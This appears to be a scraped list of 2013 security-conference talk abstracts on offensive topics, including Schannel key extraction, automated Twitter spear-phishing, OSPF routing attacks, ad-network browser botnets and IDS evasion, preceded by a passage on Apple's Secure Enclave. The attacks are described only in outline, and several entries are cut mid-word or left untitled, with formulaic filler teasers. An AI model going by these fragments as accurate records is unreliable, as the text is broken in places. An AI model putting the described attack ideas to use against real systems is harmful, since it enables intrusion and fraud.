Despite its physical segregation, the SEP shares critical SoC infrastructure with the AP, including external DRAM, the memory controller, phase-locked loop (PLL) clock generators, power management (which houses security fuse settings), and a hardware Secure Mailbox for inter-processor message passing. The SEP is enclosed within a hardware memory filter that enforces a strict one-way access boundary: all AP communications to the SEP must pass through the Secure Mailbox, whereas the Kingfisher core can access the full 64-bit physical memory space using Large Physical Address Extension (LPAE) page tables hardcoded in its Boot ROM.

The boot flow requires a coordinated sequence between the AP and the SEP. The Kingfisher core is initially held in hardware reset. The AP Boot ROM releases the reset line (an irreversible hardware action), causing the SEP to bootstrap using 4KB of internal on-chip SRAM. Because 4KB is insufficient to run SEPOS, the SEP must map external shared DRAM. The AP bootloader (iBoot) allocates two TrustZone memory regions: TZ0 for the SEP and TZ1 for AP hypervisor kernel patch protection (KPP). The SEP verifies hardware lock registers to ensure TZ0 is irreversibly protected against AP read/write access before continuing execution. To defend against physical off-chip memory interposers, the memory controller implements hardware-accelerated inline AES-256 XEX encryption, ensuring all data written to external TZ0 DRAM is encrypted transparently on the physical memory bus.

Key Takeaways:
Apple's Secure Enclave architecture demonstrates effective hardware defense-in-depth, combining physical core isolation, dedicated cryptographic peripherals, and irreversible hardware state transitions. Validating memory security requires hardware-enforced locks and transparent bus encryption, preventing privileged kernel code or physical memory interposers from tampering with external RAM. Hardware security boundaries must incorporate unidirectional filtering to ensure untrusted application processors communicate exclusively through strictly audited, isolated mailbox interfaces.

talks.title: Cunning With CNG: Soliciting Secrets From Schannel
talks.teaser: Security researchers examine technical aspects of Cunning With CNG: Soliciting Secrets From Schannel.
talks.summary:
Overview: Secure Channel (Schannel) is Microsoft's standard SSL/TLS Library underpinning services like RDP, Outlook, Internet Explorer, Windows Update, SQL Server, LDAPS, Skype and many third party applications. Schannel has been the subject of scrutiny in the past several years from an external perspective due to reported vulnerabilities, including a RCE. What about the internals? How does Schannel guard its secrets? This talk looks at how Schannel leverages Microsoft's CryptoAPI-NG (CNG) to cache the ma

Key Topics: ster keys, session keys, private and ephemeral keys, and session tickets used in TLS/SSL connections. It discusses the underlying data structures, and how to extract both the keys and other useful information that provides forensic context about connection. This information is then leveraged to decrypt session that use ephemeral cipher suites, which don't rely on the private key for decryption. Information in the cache lives for at least 10 hours by default on modern configurations, storing up to 20,000 entries for client and server each. This makes it forensically relevant in cases where other evidence of connection may have dissipated.

talks.summary:
Overview: Historically, machine learning for information security has prioritized defense: think intrusion detection systems, malware classification and botnet traffic identification. Offense can benefit from data just as well. Social networks, especially Twitter with its access to extensive personal data, bot-friendly API, colloquial syntax and prevalence of shortened links, are the perfect venues for spreading machine-generated malicious content. We present a recurrent neural network that learns to twee

Key Topics: t phishing posts targeting specific users. The model is trained using spear phishing pen-testing data, and in order to make a click-through more likely, it is dynamically seeded with topics extracted from timeline posts of both the target and the users they retweet or follow. We augment the model with clustering to identify high value targets based on their level of social engagement such as their number of followers and retweets, and measure success using click-rates of IP-tracked links. Taken together, these techniques enable the world's first automated end-to-end spear phishing campaign generator for Twitter.

talks.title: USA 2013 - Owning the Routing Table

talks.summary:
Overview: The holy grail of routing attacks is owning the routing table of a router. In this work we present a powerful OSPF attack that exploit a newly discovered ambiguity of the OSPF protocol -- the most popular routing protocol inside autonomous systems (AS). The attack allows an attacker who gained control over just a single router in an AS to control the routing tables of all other routers in that AS. The attack may be utilized to induce black holes, network cuts or longer routes in order to facilit

Key Topics: ate DoS of the routing domain or to gain access to information flows which otherwise the attacker had no access to. The attack can also be used to easily DoS a victim router using a single packet. A multi-vendor effort is now under way to fix this vulnerability which currently inflict many of today's OSPF routers. This work is a sequel to the work "Owning the Routing Table" we presented at Black Hat USA 2011. This is a joint work with Eitan Menahem, Yuval Elovici and Ariel Waizel of Telekom Innovation Laboratories at Ben Gurion University.

talks.title: USA 2013 - Spy-Jacking the Booters
talks.teaser: Analysts investigate attack surfaces and defenses concerning USA 2013 - Spy-Jacking the Booters.
talks.summary:
Overview: It's become commonplace for security reporters and providers of security technologies to find themselves targets of hackers' wrath, especially when they put criminal activity under the spotlight. Earlier this year, Brian Krebs had done some work to expose a "booter" service. Like other public security figures, he found himself the target of repeated DDoS attacks. In Brian's case, this culminated in a "SWATting" attack -- a surprise visit by dozens of heavily armed police at his front door. Resea

Key Topics: rch on "booter" services reveals a relatively unsophisticated, but high-profit criminal community of DDoS-for-hire web sites that are capable of considerable impact. They operate under legal auspices, leveraging legitimate DDoS protection services. Anyone with an axe to grind and a small amount of money can hire one of these services to have virtually any person or web site knocked off the Internet. As an indicator of how mainstream these services have become, most of them accept payment via Paypal. This talk will delve into the recent proliferation of these malicious commercial DDoS services,

Technical Details: and reveal what's been learned about their surreptitious functioning, exposing the proprietors behind these illicit services, and what is known about their targets and their thousands of paying customers. Emphasis will be placed on detailing the vulnerabilities present in most booter sites, and the lessons we can draw about how targets of these attacks can defend themselves.

Overview: Smart TVs sold over 80,000,000 units around the world in 2012. This next generation "smart" platform is becoming more and more popular. On the other hand, we hardly see security research on Smart TVs. This presentation will cover vulnerabilities we've found on the platform. You can imagine that Smart TVs have almost the exact same attack vectors that PC and Smart Phones have. Also, Smart TVs have interesting new attack surface such as the remote controller. We'll talk about attack points for Sma

Key Topics: rt TV platform and cover security bugs we discovered. This talk will mostly focus on what attackers can do on a hacked Smart TV. For example, expensive Smart TVs have many hardware devices like a Camera or Mic which, if remotely controlled, means bad guys can spy remotely without you knowing. Even more, it is possible to make Smart TVs monitor you 24/7 even though users turn off their TV, meaning #1984 could be done. In addition, we'll point out a difference of viewpoint on leaked information type among PC, Smart Phone and Smart TV. Lastly, we'll give demo of live remote surveillance cam, whic

talks.title: USA 2013 - The Factoring Dead: Preparing for the Cryptopocalypse

talks.summary:
Overview: The last several years has seen an explosion of practical exploitation of widespread cryptographic weaknesses, such as BEAST, CRIME, Lucky 13 and the RC4 bias vulnerabilities. The invention of these techniques requires a lot of hard work, deep knowledge and the ability to generate a pithy acronym, but rarely involves the use of a completely unknown weakness. Cryptography researchers have known about the existence of compression oracles, RC4 biases and problems with CBC mode for years, but the ge

Key Topics: neral information security community has been unaware of these dangers until fully working exploits were demonstrated. In this talk, the speakers will explain the latest breakthroughs in the academic crypto community and look ahead at what practical issues could arise for popular cryptosystems. Specifically, we will focus on the latest breakthroughs in discrete mathematics and their potential ability to undermine our trust in the most basic asymmetric primitives, including RSA. We will explain the basic theories behind RSA and the state-of-the-art in large numbering factoring, and how several

Technical Details: recent papers may point the way to massive improvements in this area. The talk will then switch to the practical aspects of the doomsday scenario, and will answer the question "What happens the day after RSA is broken?" We will point out the many obvious and hidden uses of RSA and related algorithms and outline how software engineers and security teams can operate in a post-RSA world. We will also discuss the results of our survey of popular products and software, and point out the ways in which

We first examine Apple's existing security mechanisms to protect against arbitrary software installation, then describe how USB capabilities can be leveraged to bypass these defense mechanisms. To ensure persistence of the resulting infection, we show how an attacker can hide their software in the same way Apple hides its own built-in applications. To demonstrate practical application of these vulnerabili

Overview: Online advertising networks can be a web hacker's best friend. For mere pennies per thousand impressions (that means browsers) there are service providers who allow you to broadly distribute arbitrary javascript -- even malicious javascript! You are SUPPOSED to use this "feature" to show ads, to track users, and get clicks, but that doesn't mean you have to abide. Absolutely nothing prevents spending $10, $100, or more to create a massive javascript-driven browser botnet instantly. The real-worl

Key Topics: d power is spooky cool. We know, because we tested it… in-the-wild. With a few lines of HTML5 and javascript code we'll demonstrate just how you can easily commandeer browsers to perform DDoS attacks, participate in email spam campaigns, crack hashes and even help brute-force passwords. Put simply, instruct browsers to make HTTP requests they didn't intend, even something as well-known as Cross-Site Request Forgery. With CSRF, no zero-days or malware is required. Oh, and there is no patch. The Web is supposed to work this way. Also nice, when the user leaves the page, our code vanishes. No tra

Before leveraging advertising networks, the reason this attack scenario didn't worry many people is because it has always been difficult to scale up, which is to say, simultaneously control enough browsers (aka botnets) to reach critical mass. Previously, web hackers tried poisoning search engine results, phishing users via email, link spamming Facebook, Twitter and instant messages, Cross-Site Scripting attacks, publishing rigged open proxies, and malicious browser plugins. Whil

talks.title: USA 2013 - Evading deep inspection for fun and shell
talks.teaser: Presenters detail vulnerability discovery and exploitation in USA 2013 - Evading deep inspection for fun and shell.
talks.summary:
Overview: Whether you have a Next Generation Firewall, an IPS, IDS, or a BDS, the security provided by these devices depends on their capability to perform robust TCP/IP reassembly. If this fails, the device can be bypassed. We researched the TCP/IP reassembly capabilities of security boxes and found that their detection can be evaded or pierced through with evasions that apply to the IP & TCP layers. The TCP reassembly capabilities of most security boxes are still poor. Instead of doing proper TCP reasse

Key Topics: mbly, many of the analyzed boxes try to prevent attacks by anomaly detection, for example, by blocking small TCP segments. However, blocking small segments leads to false positives, so this kind of blocking strategy cannot be applied to real traffic without the false positive risk. We also found evasions that allowed the attack to succeed without any logs in the security box, even if all signatures were set to block.

talks.title: USA 2013 - Hiding @ Depth
talks.teaser: Exploring analyzes USA 2013 - Hiding @ Depth.
talks.summary:
Overview: In the world of digital storage, gone are the days of spinning platters and magnetic residue. These technologies have been replaced with electron trapping, small voltage monitoring and a lot of magic. These NAND devices are ubiquitous across our culture; from smart phones to laptops to USB memory sticks to GPS navigation devices. We carry many of these devices in our pockets daily without considering the security implications. The NAND-Xplore project is an attempt to explain how NAND Flash stora

Key Topics: ge functions and to expose logical weaknesses in the hardware and implementation architectures. The project also showcases how the vulnerable underpinnings of NAND hardware can be subverted to hide and persist files on mobile devices. The project will release two open source POC tools for Android, one to inject and hide files on raw NAND based devices and another to find those files. The tools will showcase how advanced malware or other offensive tools could be using NAND to hide peristent files on your devices and how you would go about discovering them. The project also considers how typical

Technical Details: forensic software interacts with NAND devices and how those tools can be subverted. Lastly, the talk will cover how remote NAND manipulation can brick devices beyond repair, from Smartphones to SCADA, and how this vulnerability cannot realistically be patched or fixed (Hint: your current tools probably don't work as well as you would like to believe).

talks.title: USA 2013
talks.teaser: Security researchers investigate USA 2013 and analyze defensive countermeasures.
talks.summary:
Overview: Protecting yourself, your network and your users when the FBI or NSA knocks: When you get a National Security Letter, no one can hear you scream. Being served with a search warrant for a criminal investigation can be scary enough, but national security investigations can be downright Kafkaesque. You probably won't be allowed to tell anyone about it. And they may ask for more than just user data, such as for backdoor access or to install special monitoring hardware or software deep inside your ne

Key Topics: twork. This panel will bring together a range of expertise on the perils of secret "lawful intercepts" in today's networks. We'll discuss the technical risks of surveillance architectures, the legal and technical defenses against over-broad or invasive searches, and actual experiences fighting against secret surveillance orders.

talks.title: USA 2013 - OPSEC failures of spies
talks.teaser: Analysts investigate attack surfaces and defenses concerning USA 2013 - OPSEC failures of spies.
talks.summary:
Overview: The CIA is no more technologically sophisticated than your average American, and as a result, has suffered serious and embarrassing operational failures. This is a rare peek inside the CIA's intelligence gathering operations and the stunning lack of expertise they can bring to the job. In 2005, news organizations around the world reported that an Italian court had signed arrest warrants for 26 Americans in connection with an extraordinary rendition of a Muslim cleric. At the heart of the case wa

Key Topics: s the stunning lack of OPSEC the team of spies used while they surveilled and then snatched their target off the streets of Milan. The incident, known as the Italian Job inside the CIA, became an international scandal and caused global outrage. What very few people ever understood was that the CIA's top spies were laughably uneducated about cell phone technology and ignorant of the electronic fingerprints left behind. The story would be startling, though old, if not for the fact that eight years after the debacle in Milan, history repeated itself. In 2011, an entire CIA network of Lebanese inf

Technical Details: ormants was busted by Hezbollah. The reason: cell phone OPSEC failures. After receiving a warning from Mossad, who had lost their network a year earlier the same way, the CIA dismissed Hezbollah's ability to run analytic software on raw cell phone traffic. But they did. And with a little effort, the CIA's network of spies, as well as their own officers, were identified one by one. This is the true story of American Intelligence's Keystone Kops.

talks.title: USA 2013 - Clickjacking Revisited: A Perceptual View of UI Security
talks.teaser: Presenters detail vulnerability discovery and exploitation in USA 2013 - Clickjacking Revisited: A Perceptual View of UI Security.
talks.summary:
Overview: We revisit UI security attacks (such as clickjacking) from a perceptual perspective and argue that limitations of human perception make UI security difficult to achieve. We develop five novel attacks that go beyond current UI security defenses. Our attacks are powerful with a 100% success rate in one case. However, they only scratch the surface of possible perceptual attacks on UI security. We discuss possible defenses against our perceptual attacks and find that possible defenses either have an

Key Topics: unacceptable usability cost or do not provide a comprehensive defense. Finally, we posit that a number of attacks are possible with a more comprehensive study of human perception.
